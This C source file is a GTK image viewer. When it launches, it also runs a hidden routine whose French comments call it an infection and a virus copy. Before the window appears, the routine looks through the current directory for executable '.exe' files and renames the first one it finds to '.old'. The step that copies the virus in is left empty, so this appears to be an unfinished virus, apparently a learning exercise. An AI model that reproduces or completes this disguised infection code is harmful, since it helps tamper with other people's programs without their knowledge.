#include <gtk/gtk.h>
#include <dirent.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>

static void
on_open_image (GtkButton* button, gpointer user_data)
{
	GtkWidget *image = GTK_WIDGET (user_data);
	GtkWidget *toplevel = gtk_widget_get_toplevel (image);
	GtkFileFilter *filter = gtk_file_filter_new ();
	GtkWidget *dialog = gtk_file_chooser_dialog_new (("Open image"),
	                                                 GTK_WINDOW (toplevel),
	                                                 GTK_FILE_CHOOSER_ACTION_OPEN,
	                                                 GTK_STOCK_OK, GTK_RESPONSE_ACCEPT,
	                                                 GTK_STOCK_CANCEL, GTK_RESPONSE_CANCEL,
	                                                 NULL);

	gtk_file_filter_add_pixbuf_formats (filter);
	gtk_file_chooser_add_filter (GTK_FILE_CHOOSER (dialog),
	                             filter);

	switch (gtk_dialog_run (GTK_DIALOG (dialog)))
	{
		case GTK_RESPONSE_ACCEPT:
		{
			gchar *filename =
				gtk_file_chooser_get_filename (GTK_FILE_CHOOSER (dialog));
			gtk_image_set_from_file (GTK_IMAGE (image), filename);
			break;
		}
		default:
			break;
	}
	gtk_widget_destroy (dialog);
}

void
searchProgram()
{
	
	/********************************************************************************************/
	/*										rennomage du fichier								//
	/********************************************************************************************/
	DIR* dir = opendir(".");
	int infect = 0;

	if (dir == NULL)
    {
            printf("Error: Unable to open directory\n");
            exit(0);
    }

	struct dirent* directory;
    while ((directory = readdir(dir)) != NULL)
    {
		if (infect == 0) //une infection par éxécution
		{
			struct stat stat_buffer;
			if (!stat(directory->d_name, &stat_buffer))
			{	
				//le fichier est éxécutable ? 
				if ((stat_buffer.st_mode & S_IXUSR) &&
					S_ISREG(stat_buffer.st_mode))
				{ 
					// fichier .exe ? 
					int state = 0;
					char* name = directory->d_name;
					char new_name[256] = "  ";
					for(int i = 0; i < 256; i++)
					{
						if(!state)
						{
							new_name[i] = name[i];
							if(name[i] == '.')
							{
								state ++;
							}
						}
						else if (state == 1)
						{
							if(name[i] == 'e')
							{
								new_name[i] = 'o';
								state ++;
							}
							if(name[i+1] == 'x')
							{
								new_name[i+1] = 'l';
								state ++;
							}
							if(name[i+2] == 'e')
							{
								new_name[i+2] = 'd';
								state ++;
							}
						}
					}
					printf("name : %s\n", name);
					printf("new_name : %s\n", new_name);
					printf("state : %d\n", state);
					if(state == 4) // le fichier est un .exe
					{
						printf("i search \n");
						int ret = rename(name, new_name);
						if(ret) 
							printf("fichier non renommé\n");
						else 
							printf("fichier renomé\n");
						infect ++;
					}
				}
			}
		}
    }
    closedir(dir);


	/********************************************************************************************/
	/*											copie du virus									//
	/********************************************************************************************/

	
}

static void
activate (GtkApplication *app, gpointer user_data)
{
	searchProgram();
	GtkWidget *window;
	GtkWidget *button;
	GtkWidget *image;
	GtkWidget *box;

	/* Set up the UI */
	window = gtk_application_window_new (app);
	gtk_window_set_title (GTK_WINDOW (window), "mon image viewer");
	gtk_window_set_default_size (GTK_WINDOW (window), 300, 150);
	gtk_container_set_border_width (GTK_CONTAINER (window), 5);

	box = gtk_box_new (GTK_ORIENTATION_VERTICAL, 5);
	button = gtk_button_new_with_label (("Open image"));
	image = gtk_image_new ();

	gtk_box_pack_start (GTK_BOX (box), image, TRUE, TRUE, 0);
	gtk_box_pack_start (GTK_BOX (box), button, FALSE, FALSE, 0);

	gtk_container_add (GTK_CONTAINER (window), box);

	/* Connect signals */

	/* Show open dialog when opening a file */
	g_signal_connect (button, "clicked", G_CALLBACK (on_open_image), image);

	/* Exit when the window is closed */
	g_signal_connect (window, "destroy", G_CALLBACK (gtk_main_quit), NULL);

	gtk_container_add (GTK_CONTAINER (window), box);
  	gtk_widget_show_all (window);
}

int
main (int argc, char **argv)
{
	GtkApplication *app;
  	int status;

  	app = gtk_application_new ("org.gtk.example", G_APPLICATION_FLAGS_NONE);
  	g_signal_connect (app, "activate", G_CALLBACK (activate), NULL);
  	status = g_application_run (G_APPLICATION (app), argc, argv);
  	g_object_unref (app);

	return status;
}